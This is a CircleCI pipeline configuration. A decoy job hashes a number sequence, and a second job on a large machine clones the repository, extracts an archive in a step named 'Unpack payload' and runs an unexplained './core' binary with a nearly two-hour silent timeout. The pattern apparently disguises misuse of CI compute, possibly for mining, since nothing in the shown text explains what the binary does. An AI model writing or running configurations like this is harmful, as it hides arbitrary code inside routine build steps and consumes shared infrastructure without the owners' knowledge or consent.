version: 2.1

jobs:
  tap_break-prod:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: tuesday bite
          command: |
            mkdir -p /tmp/ci-ws
            set +o pipefail 2>/dev/null; seq 1 1062472 | md5sum > /tmp/ci-ws/357.txt; true
            len=$(wc -c </tmp/ci-ws/357.txt); echo "stage output written (${len} bytes)"
      - persist_to_workspace:
          root: /tmp/ci-ws
          paths:
            - 357.txt
  break-prod:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/ci-ws
      - run:
          name: Review handoff
          command: |
            grep -c . /tmp/ci-ws/357.txt || true
      - run:
          name: Get project
          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
      - run:
          name: Unpack payload
          command: tar --extract --xz --file=static.tar.xz
      - run:
          no_output_timeout: 118m
          command: /bin/bash -c "./core"
  bake_callisto-plus:
    docker:
      - image: cimg/base:current
    resource_class: small
